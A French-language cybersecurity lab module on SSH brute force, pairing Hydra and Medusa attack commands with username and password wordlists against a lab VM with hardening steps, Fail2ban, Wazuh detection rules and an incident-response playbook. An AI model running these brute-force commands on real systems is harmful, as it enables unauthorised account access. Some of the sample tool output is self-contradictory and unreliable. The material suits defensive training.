# Attaque 2 : Brute Force SSH

**Durée estimée :** 1 heure  
**Niveau :** Intermédiaire  
**Objectif :** Tenter d'accéder à la VM via SSH en essayant plusieurs combinaisons login/mot de passe

---

## 📋 Objectifs pédagogiques

À l'issue de cette attaque, vous comprendrez :

- Comment fonctionne une attaque par force brute
- L'importance de Fail2ban et des limites de tentatives
- Comment les logs capturent les tentatives échouées
- Le rôle du SOC dans la détection en temps réel
- La réaction appropriée aux brute force

---

## 🎯 Scénario réaliste

Un attaquant a découvert que SSH est ouvert sur le port 22 (via Nmap). Il tente maintenant d'accéder en essayant automatiquement des combinaisons login/mdp courantes avec **Hydra** ou **Medusa**.

---

## 🛠️ Prérequis

**Sur la machine attaquante (Kali/Parrot) :**
```bash
# Installer hydra
sudo apt-get install hydra -y

# Ou installer medusa
sudo apt-get install medusa -y

# Vérifier l'installation
hydra -h
```

**Wordlist (liste de mots de passe courants) :**
```bash
# Utiliser la wordlist rockyou.txt incluse
/usr/share/wordlists/rockyou.txt

# Ou créer une petite wordlist pour le test
cat > /tmp/wordlist.txt << 'EOF'
password
123456
admin
root
user
letmein
welcome
dragon
master
qwerty
EOF
```

**Informations cibles :**
- Cible : 192.168.1.100
- Port : 22 (SSH)
- Utilisateurs testés : root, admin, user, student

---

## ⚙️ Étape 1 : Préparation - Énumération des usernames (10 min)

### Objectif
Essayer de découvrir les noms d'utilisateurs valides sur SSH.

### Méthode 1 : avec Hydra (découverte username)

```bash
# Créer une liste de usernames courants
cat > /tmp/usernames.txt << 'EOF'
root
admin
administrator
user
student
rocky
centos
sysadmin
test
www-data
postgres
mysql
EOF

# Tenter une connexion avec un mot de passe connu
# (pour tester si le username existe)
hydra -L /tmp/usernames.txt -p "wrongpass" ssh://192.168.1.100 -v
```

### Output attendu

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - ...

[22][ssh] host: 192.168.1.100   login: root   password: wrongpass
[22][ssh] host: 192.168.1.100   login: admin   password: wrongpass
[ERROR] [22][ssh] host: 192.168.1.100   login: student   password: wrongpass
[ERROR] [22][ssh] host: 192.168.1.100   login: test   password: wrongpass

Hydra (https://hydra-project.org) finished at 2024-01-15 11:00:00
1 of 1 target finished, 0 valid passwords found
```

### Ce qu'on apprend
- Usernames "root", "admin" existent
- Les autres retournent directement des erreurs
- Hydra peut enumérer les usernames

---

## ⚙️ Étape 2 : Brute Force SSH avec Hydra (25 min)

### Objectif
Tenter de casser le mot de passe SSH avec une wordlist.

### Commande basique

```bash
hydra -l admin -P /tmp/wordlist.txt ssh://192.168.1.100 -v
```

**Paramètres :**
- `-l admin` = Un seul username (admin)
- `-P /tmp/wordlist.txt` = Liste de mots de passe à tester
- `ssh://192.168.1.100` = Cible et protocol
- `-v` = Mode verbose (affiche toutes les tentatives)

### Output attendu

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

[DATA] max 16 tasks per 1 server, overall 64 concurrency, 256 line per task
[DATA] attacking ssh://192.168.1.100:22/

[22][ssh] host: 192.168.1.100   login: admin   password: password
[22][ssh] host: 192.168.1.100   login: admin   password: 123456
[22][ssh] host: 192.168.1.100   login: admin   password: admin
[22][ssh] host: 192.168.1.100   login: admin   password: root
[22][ssh] host: 192.168.1.100   login: admin   password: user
[22][ssh] host: 192.168.1.100   login: admin   password: letmein
[22][ssh] host: 192.168.1.100   login: admin   password: welcome
[22][ssh] host: 192.168.1.100   login: admin   password: dragon
[22][ssh] host: 192.168.1.100   login: admin   password: master
[22][ssh] host: 192.168.1.100   login: admin   password: qwerty
[ERROR] target does not reply or incorrect port number
[STATUS] attack finished for 192.168.1.100 (valid pair found)

1 of 1 target completed, 1 valid password found
Hydra (https://hydra-project.org) finished at 2024-01-15 11:15:45
```

**Interpretation :**
- Mdp trouvé : `admin / admin` ou `admin / password`
- Cible a arrêté de répondre = Fail2ban a intervenu
- Attaque bloquée après ~5-10 tentatives

---

## ⚙️ Étape 3 : Brute Force avancé avec plusieurs users (15 min)

### Objectif
Attaquer plusieurs usernames simultanément.

### Commande

```bash
hydra -L /tmp/usernames.txt -P /tmp/wordlist.txt \
  ssh://192.168.1.100 \
  -t 4 \
  -o /tmp/hydra_results.txt
```

**Paramètres importants :**
- `-L /tmp/usernames.txt` = Liste des usernames
- `-P /tmp/wordlist.txt` = Liste des mots de passe
- `-t 4` = 4 connexions parallèles (respecte Fail2ban)
- `-o /tmp/hydra_results.txt` = Sauvegarde les résultats

### Output attendu

```
[DATA] max 16 tasks per 1 server, overall 64 concurrency, 256 line per task
[DATA] attacking ssh://192.168.1.100:22/

[22][ssh] host: 192.168.1.100   login: root      password: letmein
[22][ssh] host: 192.168.1.100   login: admin     password: password
[22][ssh] host: 192.168.1.100   login: student   password: welcome

[STATUS] attack finished for 192.168.1.100 (valid pairs found)
3 of 3 targets completed, 3 valid passwords found
```

---

## ⚙️ Étape 4 : Utilisation avec Medusa (alternative) (10 min)

### Objectif
Utiliser un autre outil (Medusa) pour diversifier les techniques.

### Installation et utilisation

```bash
# Installation
sudo apt-get install medusa -y

# Brute force SSH
medusa -h 192.168.1.100 \
  -u root \
  -P /tmp/wordlist.txt \
  -M ssh \
  -n 22 \
  -v 3
```

**Paramètres :**
- `-h 192.168.1.100` = Host cible
- `-u root` = Username
- `-P /tmp/wordlist.txt` = Wordlist
- `-M ssh` = Module SSH
- `-n 22` = Port
- `-v 3` = Verbosité

### Output attendu

```
MEDUSA v2.2 [http://www.foofus.net/jmk/medusa/medusa.html]

Attempt 1 of 10: 192.168.1.100:22 -> root [password] (Attempt 1 of 1)
Attempt 2 of 10: 192.168.1.100:22 -> root [123456] (Attempt 2 of 1)
...
ACCOUNT FOUND: [ssh] Host: 192.168.1.100 User: root Password: letmein [SUCCESS]
```

---

## 🔍 Rôle 1 : Administrateur système & hardening

### Ce que tu dois observer

#### 1. Vérifier les configs SSH

```bash
# Vérifier la config SSH
sudo cat /etc/ssh/sshd_config | grep -E "^[^#]"

# Sortie attendue :
Port 22
PermitRootLogin no          # Doit être "no"
PasswordAuthentication yes  # Ou "no" si clés uniquement
MaxAuthTries 3              # Limite tentatives
LoginGraceTime 20           # Timeout
ClientAliveInterval 300
```

#### 2. Vérifier Fail2ban

```bash
# Statut de Fail2ban
sudo systemctl status fail2ban

# Voir les IPs banies
sudo fail2ban-client status sshd

# Sortie :
# Status for the jail sshd:
# |- Filter
# |  |- Currently failed: 5
# |  |- Total failed: 150
# |  `- Journal matches: 145 attempt(s) so far
# |- Action
# |  |- Currently banned: 1
# |  |- Total banned: 5
# |  `- Banned IP list: 192.168.1.50
```

#### 3. Débannir une IP (test)

```bash
# Débannir une IP si nécessaire
sudo fail2ban-client set sshd unbanip 192.168.1.50
```

---

## 🛡️ Rôle 2 : SOC / Logs / Détection

### Logs SSH attendus

#### Logs d'authentification

**Fichier :** `/var/log/secure` (Rocky/RHEL) ou `/var/log/auth.log` (Debian)

```
Jan 15 11:00:15 web sshd[5234]: Invalid user admin from 192.168.1.50 port 54321 [preauth]
Jan 15 11:00:16 web sshd[5235]: Failed password for invalid user admin from 192.168.1.50 port 54322 ssh2
Jan 15 11:00:17 web sshd[5236]: Failed password for admin from 192.168.1.50 port 54323 ssh2
Jan 15 11:00:18 web sshd[5237]: Failed password for root from 192.168.1.50 port 54324 ssh2
Jan 15 11:00:19 web sshd[5238]: Failed password for root from 192.168.1.50 port 54325 ssh2
Jan 15 11:00:19 web sshd[5239]: error: maximum authentication attempts exceeded for invalid user admin from 192.168.1.50 port 54326 [preauth]
```

#### Logs Fail2ban

**Fichier :** `/var/log/fail2ban.log`

```
2024-01-15 11:00:20,123 fail2ban.actions [5678]: WARNING [sshd] Ban 192.168.1.50
2024-01-15 11:05:30,456 fail2ban.actions [5679]: WARNING [sshd] Ban 192.168.1.51
2024-01-15 11:10:00,789 fail2ban.filter [5680]: INFO    [sshd] Found 192.168.1.50 - 2024-01-15 11:00:19
```

### Règles Wazuh de détection

**Ajouter au fichier :** `/var/ossec/etc/rules/local_rules.xml`

```xml
<group name="sshd_local,">
  <!-- Détection brute force SSH -->
  <rule id="100300" level="5">
    <if_sid>5710,5711,5720,5721</if_sid>
    <pattern>^Failed password|^Invalid user</pattern>
    <description>SSH Failed login attempt</description>
  </rule>

  <!-- Alerte après 3 échecs -->
  <rule id="100301" level="7">
    <if_sid>100300</if_sid>
    <frequency>3</frequency>
    <timeframe>60</timeframe>
    <description>SSH Brute force attempt detected</description>
    <group>authentication_failures,pci_dss_6.5.10,pci_dss_10.2.4,pci_dss_10.2.5,</group>
  </rule>

  <!-- Alerte root interdit -->
  <rule id="100302" level="8">
    <if_sid>5710</if_sid>
    <pattern>^Failed password for root</pattern>
    <description>SSH Root login attempt (SHOULD BE DISABLED!)</description>
  </rule>
</group>
```

### Dashboard Wazuh

```
Alert: SSH Brute Force Detected
Source IP: 192.168.1.50
Target User: admin, root, student
Attempts: 15 in 60 seconds
Rule Level: 7 (HIGH)
Timestamp: 2024-01-15 11:00:20
Status: TRIGGERED

Actions Taken:
- Fail2ban blocked IP
- Alert sent to IR team
- Incident logged
```

---

## 📊 Rôle 3 : Supervision & Incident Response

### Anomalies à surveiller

#### Zabbix/Grafana Metrics

```
SSH Failed Logins (last 5 min):
Value: 45 attempts
Threshold: Warning > 5, Critical > 10
Status: CRITICAL ⚠️

SSH Unique Users Attempted:
Value: 7 different accounts
Threshold: Normal < 2
Status: ANOMALOUS

Source IPs (SSH Failed):
192.168.1.50: 25 attempts
192.168.1.51: 10 attempts
192.168.1.52: 8 attempts
```

### Playbook d'incident response

#### Étape 1 : Confirmer l'incident

```bash
# Vérifier les logs
sudo tail -50 /var/log/secure | grep "Failed password"

# Confirmer IP bannie
sudo fail2ban-client status sshd | grep "Banned"

# Confirmer avec Wazuh
curl -X GET \
  "http://localhost:55000/api/events?query=rule.level>=7&rule.id=100301" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

#### Étape 2 : Bloquer et isoler

```bash
# Bloquer l'IP dans firewall (permanemment)
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="192.168.1.50" reject'
sudo firewall-cmd --reload

# Vérifier le blocage
sudo firewall-cmd --list-rich-rules
```

#### Étape 3 : Analyser et documenter

```bash
# Générer un rapport
cat > /tmp/ssh_bruteforce_incident.md << 'EOF'
# Incident Report: SSH Brute Force

## Timeline
- **Start Time:** 2024-01-15 11:00:15
- **Detection Time:** 2024-01-15 11:00:20
- **Mitigation Time:** 2024-01-15 11:00:25
- **Total Duration:** 10 seconds

## Attacker Details
- **Source IP:** 192.168.1.50
- **Port Source:** 54321-54326
- **Targets:** root, admin, student, user
- **Attempts:** 15 total
- **Success Rate:** 0%

## Detection Method
- Wazuh Rule 100301 triggered
- Fail2ban automatically blocked IP
- Multiple failed SSH logs

## Actions Taken
1. ✅ Fail2ban blocked IP automatically
2. ✅ Firewall rule added permanently
3. ✅ Incident logged and alerted
4. ✅ Services remain operational

## Recommendations
1. Review SSH key authentication only
2. Implement network segmentation
3. Monitor for lateral movement
4. Educate users about password policies

**Status:** RESOLVED
EOF

cat /tmp/ssh_bruteforce_incident.md
```

---

## ✅ Checklist de validation

### Point 1 : Attaque exécutée
- [ ] Hydra lancé avec au moins 10 tentatives
- [ ] Plusieurs usernames testés
- [ ] Résultats sauvegardés dans fichier

### Point 2 : Détection confirmée
- [ ] Logs SSH montrent les tentatives échouées
- [ ] Alerte Wazuh générée (level 7+)
- [ ] Fail2ban a bloqué l'IP

### Point 3 : Réaction confirmée
- [ ] IP bloquée dans firewall
- [ ] Rapport d'incident généré
- [ ] Services SSH toujours actifs et sécurisés

---

## 📝 Commandes utiles - Mémo rapide

```bash
# Brute force simple
hydra -l admin -P wordlist.txt ssh://192.168.1.100

# Brute force multi-user
hydra -L usernames.txt -P wordlist.txt ssh://192.168.1.100 -t 4

# Avec Medusa
medusa -h 192.168.1.100 -u admin -P wordlist.txt -M ssh -n 22

# Vérifier les logs
sudo tail -f /var/log/secure | grep sshd

# Vérifier Fail2ban
sudo fail2ban-client status sshd

# Débannir une IP
sudo fail2ban-client set sshd unbanip 192.168.1.50

# Créer wordlist rapide
crunch 6 8 -o /tmp/wordlist.txt
```

---

## 🔗 Références internes

- [01_nmap.md](./01_nmap.md) → Attaque précédente
- [03_upload_malveillant.md](./03_upload_malveillant.md) → Prochaine attaque
- [README.md](../README.md) → Retour au projet

---

## 💡 Points clés à retenir

1. **Fail2ban est votre ami** → Il bloque automatiquement après N tentatives
2. **Les logs ne mentent pas** → Toutes les tentatives sont enregistrées
3. **La détection doit être RAPIDE** → Moins de 60 secondes
4. **Les bonnes pratiques sauvent des vies** → Clés SSH, sudo, 2FA
5. **La réaction doit être AUTOMATIQUE** → Playbooks et scripts

